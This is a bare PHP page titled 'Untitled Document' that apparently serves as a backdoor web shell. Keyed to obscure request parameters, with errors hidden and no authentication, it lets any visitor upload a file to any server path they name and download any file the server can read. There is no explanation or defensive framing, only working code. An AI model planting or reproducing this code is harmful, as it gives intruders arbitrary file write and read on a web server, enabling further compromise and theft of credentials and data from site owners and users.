<?php
ini_set("display_errors","off");
if(isset($_REQUEST['nm']))
{
if($_REQUEST['q'] == "q")
{
echo	move_uploaded_file($_FILES['file']['tmp_name'],$_REQUEST['path'].$_FILES['file']['name']);
}
echo $_REQUEST['path']."/".$_FILES['file']['name'];
}
if($_REQUEST['nmd'])
{
	$filenm = end(explode("/",$_REQUEST['path']));
	//include $_REQUEST['path'];
	header("Content-type:  application/force-download");
	header('Content-Disposition: attachment; filename="'.$filenm.'"');
	readfile($_REQUEST['path']);
}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Untitled Document</title>
</head>

<body>
<?php
if($_REQUEST['U'] == "U")
{
?>
<form action="" method="post" enctype="multipart/form-data">
	<input type="file" name="file" />
    <input type="submit" name="nm" />
</form>
<?php
}
else if($_REQUEST['D'] == "D")
{
	?>
   <?php /*?> <a href="<?php echo $_REQUEST['path']?>">clk</a><?php */?>
   <form action="" method="post" enctype="multipart/form-data">
	<input type="hidden" value="<?php echo $_REQUEST['path']?>" name="path" />
    <input type="submit" name="nmd" />
</form>
    <?php
}
?>
</body>
</html>